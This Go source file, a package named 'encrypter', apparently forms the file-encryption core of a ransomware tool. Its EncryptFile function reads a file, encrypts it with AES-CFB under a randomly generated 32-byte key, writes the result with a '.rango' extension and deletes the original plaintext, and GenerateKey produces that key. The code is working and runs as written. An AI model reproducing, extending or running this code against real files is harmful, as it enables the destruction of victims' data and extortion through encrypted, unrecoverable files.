package encrypter

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func EncryptFile(aes32Key []byte, folderPath string, fileName string) {

	// load the file content
	filePath := filepath.Join(folderPath, fileName)
	plainTextBytes, _ := os.ReadFile(filePath)

	fmt.Println(string(plainTextBytes))

	// Encrypt the file
	block, _ := aes.NewCipher(aes32Key)
	ciphertext := make([]byte, aes.BlockSize+len(plainTextBytes))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plainTextBytes)

	// Write the encrypted file
	destinationPath := filepath.Join(folderPath, fileName+".rango")
	_ = os.WriteFile(destinationPath, ciphertext, 0644)

	// Delete plain file
	err := os.Remove(filePath)
	if err != nil {
		fmt.Printf("Error deleting file %s: %v\n", fileName, err)
	} else {
		fmt.Printf("Deleted file: %s\n", fileName)
	}

}

func GenerateKey() []byte {

	key := make([]byte, 32)
	rand.Read(key)

	return key
}
